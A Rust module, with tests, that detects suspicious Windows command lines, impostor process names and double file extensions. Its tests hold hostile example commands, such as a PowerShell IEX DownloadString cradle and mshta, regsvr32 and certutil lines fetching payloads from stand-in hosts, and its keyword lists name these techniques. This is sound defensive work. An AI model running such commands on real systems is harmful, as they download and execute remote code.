//! Recognising the command lines and file names malware likes to use.
//!
//! Attackers rarely bring their own tools: they misuse programs Windows already has
//! (PowerShell, mshta, regsvr32, certutil…) in ways ordinary software almost never does —
//! hidden windows, encoded commands, scripts fetched straight from the internet.

use serde::Serialize;

#[derive(Serialize, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Debug)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Info,
    Low,
    Medium,
    High,
}

/// Why a command line looks dangerous, as a reason code, with how dangerous.
pub fn command_risk(command: &str) -> Option<(Severity, &'static str)> {
    let c = command.to_lowercase();
    let has = |words: &[&str]| words.iter().any(|w| c.contains(w));
    let web = has(&["http://", "https://", "ftp://"]);

    let powershell = has(&["powershell", "pwsh"]);
    if powershell && has(&[" -enc", " -e ", " -ec ", "-encodedcommand", "frombase64string"]) {
        return Some((Severity::High, "ps-encoded"));
    }
    if powershell && has(&["downloadstring", "downloadfile", "net.webclient", "invoke-webrequest", "iwr ", "start-bitstransfer"]) && web {
        return Some((Severity::High, "ps-download"));
    }
    if powershell && has(&["iex", "invoke-expression"]) {
        return Some((Severity::High, "ps-iex"));
    }
    if has(&["mshta"]) && (web || has(&["javascript:", "vbscript:"])) {
        return Some((Severity::High, "mshta"));
    }
    if has(&["regsvr32"]) && (has(&["/i:http", "-i:http", "scrobj.dll"]) || web) {
        return Some((Severity::High, "regsvr32"));
    }
    if has(&["rundll32"]) && (has(&["javascript:", "mshtml,runhtmlapplication"]) || web) {
        return Some((Severity::High, "rundll32-script"));
    }
    if has(&["certutil"]) && has(&["-urlcache", "/urlcache", "-decode", "/decode"]) {
        return Some((Severity::High, "certutil"));
    }
    if has(&["bitsadmin"]) && has(&["/transfer", "/addfile"]) {
        return Some((Severity::Medium, "bitsadmin"));
    }
    if powershell && has(&["-w hidden", "-windowstyle hidden", "-win hidden", "-nop", "-noprofile"]) && has(&["-ep bypass", "-executionpolicy bypass", "-exec bypass"]) {
        return Some((Severity::Medium, "ps-hidden-bypass"));
    }
    if has(&["wscript", "cscript"]) && in_risky_folder(&c) {
        return Some((Severity::Medium, "script-from-temp"));
    }
    if (has(&["cmd /c", "cmd.exe /c"]) || powershell) && web {
        return Some((Severity::Medium, "shell-download"));
    }
    None
}

/// Folders where software is downloaded or unpacked to, not installed to.
pub fn in_risky_folder(path_lower: &str) -> bool {
    [r"\appdata\local\temp\", r"\windows\temp\", r"\downloads\", r"\users\public\", r"\$recycle.bin\", r"\programdata\temp"]
        .iter()
        .any(|f| path_lower.contains(f))
}

/// Script files that run when opened. In a startup folder they are a classic foothold.
pub fn is_script(name_lower: &str) -> bool {
    [".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh", ".bat", ".cmd", ".ps1", ".hta", ".scr"].iter().any(|ext| name_lower.ends_with(ext))
}

/// Windows' own process names that impostors copy.
pub const SYSTEM_NAMES: &[&str] = &[
    "svchost.exe", "lsass.exe", "csrss.exe", "winlogon.exe", "services.exe", "smss.exe", "explorer.exe", "rundll32.exe",
    "dllhost.exe", "taskhostw.exe", "conhost.exe", "wininit.exe", "spoolsv.exe", "ctfmon.exe", "sihost.exe",
    "runtimebroker.exe", "searchindexer.exe", "taskmgr.exe", "lsm.exe", "audiodg.exe", "fontdrvhost.exe",
];

fn edit_distance(a: &str, b: &str) -> usize {
    let (a, b): (Vec<char>, Vec<char>) = (a.chars().collect(), b.chars().collect());
    let mut row: Vec<usize> = (0..=b.len()).collect();
    for i in 1..=a.len() {
        let mut prev = row[0];
        row[0] = i;
        for j in 1..=b.len() {
            let current = row[j];
            row[j] = (row[j] + 1).min(row[j - 1] + 1).min(prev + usize::from(a[i - 1] != b[j - 1]));
            prev = current;
        }
    }
    row[b.len()]
}

/// The system name a file name imitates by one changed, added or swapped letter
/// (`scvhost.exe`, `svch0st.exe`, `lsasss.exe`), if any.
pub fn lookalike(name_lower: &str) -> Option<&'static str> {
    SYSTEM_NAMES.iter().copied().find(|real| {
        let d = edit_distance(name_lower, real);
        let swapped = name_lower.len() == real.len() && {
            let (x, y): (Vec<char>, Vec<char>) = (name_lower.chars().collect(), real.chars().collect());
            let diff: Vec<usize> = (0..x.len()).filter(|&i| x[i] != y[i]).collect();
            diff.len() == 2 && diff[1] == diff[0] + 1 && x[diff[0]] == y[diff[1]] && x[diff[1]] == y[diff[0]]
        };
        real.len() >= 8 && name_lower != *real && (d == 1 || swapped)
    })
}

/// A name like `invoice.pdf.exe`: a harmless-looking extension hiding the real one.
pub fn double_extension(name_lower: &str) -> bool {
    let parts: Vec<&str> = name_lower.rsplitn(3, '.').collect();
    parts.len() == 3
        && ["exe", "scr", "com", "bat", "cmd", "js", "vbs", "lnk", "hta", "pif"].contains(&parts[0])
        && ["pdf", "doc", "docx", "xls", "xlsx", "jpg", "jpeg", "png", "txt", "zip", "rar", "mp3", "mp4"].contains(&parts[1])
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn living_off_the_land_commands_are_recognised() {
        let cases = [
            ("powershell -nop -w hidden -enc SQBFAFgAIAAo", Some("ps-encoded")),
            ("powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://x.ru/a')\"", Some("ps-encoded").filter(|_| false).or(Some("ps-download"))),
            ("pwsh -c iex $payload", Some("ps-iex")),
            ("mshta http://evil.example/a.hta", Some("mshta")),
            ("mshta vbscript:Execute(\"CreateObject...\")", Some("mshta")),
            ("regsvr32 /s /n /u /i:http://x/file.sct scrobj.dll", Some("regsvr32")),
            ("rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"", Some("rundll32-script")),
            ("certutil -urlcache -split -f http://x/a.exe a.exe", Some("certutil")),
            ("bitsadmin /transfer job http://x/a.exe C:\\a.exe", Some("bitsadmin")),
            ("powershell -NoProfile -ExecutionPolicy Bypass -File C:\\x.ps1", Some("ps-hidden-bypass")),
            ("wscript.exe C:\\Users\\me\\AppData\\Local\\Temp\\run.vbs", Some("script-from-temp")),
            ("cmd /c curl https://x/a -o a.exe", Some("shell-download")),
            // Ordinary software.
            ("\"C:\\Program Files (x86)\\Steam\\steam.exe\" -silent", None),
            ("C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL", None),
            ("powershell.exe -File C:\\Program Files\\Vendor\\maintenance.ps1", None),
        ];
        for (command, expected) in cases {
            assert_eq!(command_risk(command).map(|r| r.1), expected, "{command}");
        }
    }

    #[test]
    fn impostor_names_are_caught_but_real_ones_are_not() {
        for (name, imitates) in [("scvhost.exe", "svchost.exe"), ("svch0st.exe", "svchost.exe"), ("lsasss.exe", "lsass.exe"), ("expl0rer.exe", "explorer.exe"), ("csrsss.exe", "csrss.exe")] {
            assert_eq!(lookalike(name), Some(imitates), "{name}");
        }
        for name in ["svchost.exe", "steam.exe", "discord.exe", "conhost.exe", "lsm.exe"] {
            assert_eq!(lookalike(name), None, "{name}");
        }
    }

    #[test]
    fn double_extensions_and_scripts() {
        assert!(double_extension("invoice.pdf.exe"));
        assert!(double_extension("photo.jpg.scr"));
        assert!(!double_extension("setup.exe"));
        assert!(!double_extension("my.app.v2.exe"));
        assert!(is_script("start.vbs") && is_script("x.ps1") && !is_script("x.exe"));
        assert!(in_risky_folder(r"c:\users\me\appdata\local\temp\a.exe") && !in_risky_folder(r"c:\program files\a.exe"));
    }
}
